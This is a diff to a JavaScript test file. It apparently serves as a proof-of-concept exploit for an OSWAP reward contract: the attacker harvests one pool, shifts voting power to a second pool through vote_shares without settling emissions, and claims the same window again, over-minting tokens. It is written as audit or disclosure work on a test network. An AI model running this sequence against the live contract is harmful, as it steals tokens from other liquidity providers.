@@ -167,27 +167,41 @@ describe('OSWAP over-mint via vote_shares without emission settlement', function
 	})
 
 	it('EXPLOIT: harvest pool1 (legit), move VP pool1->pool2 without settling, harvest pool2 (stolen)', async () => {
+		const pre = await this.readState()
+		console.log('\n=== pre-travel diagnostics ===')
+		console.log('total_normalized_vp :', pre.state.total_normalized_vp)
+		console.log('supply              :', pre.state.supply)
+		console.log('last_emissions_ts   :', pre.state.last_emissions_ts)
+		console.log('lp_emissions        :', pre.state.lp_emissions)
+
 		// let one emission window accrue while VP sits entirely on pool1 and neither pool is touched
-		await this.network.timetravel({ shift: '180d' })
+		const tt = await this.network.timetravel({ shift: '180d' })
+		console.log('timetravel -> error:', tt.error, ' timestamp:', tt.timestamp)
+		expect(tt.error).to.be.null
+		await this.network.witnessUntilStable()  // advance the DAG so the AA sees the traveled time
 
 		// (1) harvest pool1 — LEGITIMATE: pool1 held the attacker's full VP for the whole window
 		const R1 = await this.get_lp_reward(this.pool1)
-		await this.network.getAaResponseToUnitOnNode(this.attacker,
-			(await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { pool_asset: this.pool1, withdraw_lp_reward: 1 } })).unit)
+		const { unit: uh1 } = await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { pool_asset: this.pool1, withdraw_lp_reward: 1 } })
+		const { response: rh1 } = await this.network.getAaResponseToUnitOnNode(this.attacker, uh1)
+		if (rh1.response.error) console.log('harvest1 error:', rh1.response.error)
+		const afterH1 = await this.readState()
+		console.log('after harvest1 -> lp_emissions:', afterH1.state.lp_emissions, ' getter R1:', R1, ' bounced:', rh1.bounced)
 
 		// (2) move ALL voting power pool1 -> pool2 via vote_shares. THIS PATH DOES NOT SETTLE EMISSIONS.
-		await this.network.getAaResponseToUnitOnNode(this.attacker,
-			(await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000,
-				data: { vote_shares: 1, group_key1: 'g1', changes: { a1: -this.attacker_vp, a2: this.attacker_vp } } })).unit)
+		const { unit: uv } = await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { vote_shares: 1, group_key1: 'g1', changes: { a1: -this.attacker_vp, a2: this.attacker_vp } } })
+		const { response: rv } = await this.network.getAaResponseToUnitOnNode(this.attacker, uv)
+		if (rv.response.error) console.log('vote_shares error:', rv.response.error)
 
 		// (3) harvest pool2 — STOLEN: pool2 held 0 VP during the window, but now claims the whole window at full share
 		const R2 = await this.get_lp_reward(this.pool2)
-		await this.network.getAaResponseToUnitOnNode(this.attacker,
-			(await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { pool_asset: this.pool2, withdraw_lp_reward: 1 } })).unit)
+		const { unit: uh2 } = await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { pool_asset: this.pool2, withdraw_lp_reward: 1 } })
+		const { response: rh2 } = await this.network.getAaResponseToUnitOnNode(this.attacker, uh2)
+		if (rh2.response.error) console.log('harvest2 error:', rh2.response.error)
 
 		const vars = await this.readState()
 		const windowLpEmission = vars.state.lp_emissions - this.lp_emissions_before  // E: scheduled LP emission for the window
-		const minted = R1 + R2                                                       // total OSWAP minted to the attacker
+		const minted = R1 + R2                                                       // total OSWAP the attacker can claim
 
 		console.log('\n=== exploit result ===')
 		console.log('scheduled LP emission for window (E) :', windowLpEmission)
@@ -200,7 +214,7 @@ describe('OSWAP over-mint via vote_shares without emission settlement', function
 
 		// PROOF OF IMPACT:
 		// pool2 stole ~the same amount pool1 legitimately earned...
-		expect(R2).to.be.closeTo(R1, R1 * 0.02)
+		expect(R2).to.be.closeTo(R1, Math.max(R1 * 0.02, 1))
 		// ...so total minted exceeds the scheduled LP emission for the window (Σ received_emissions > lp_emissions).
 		expect(minted).to.be.greaterThan(windowLpEmission * 1.5)
 	})
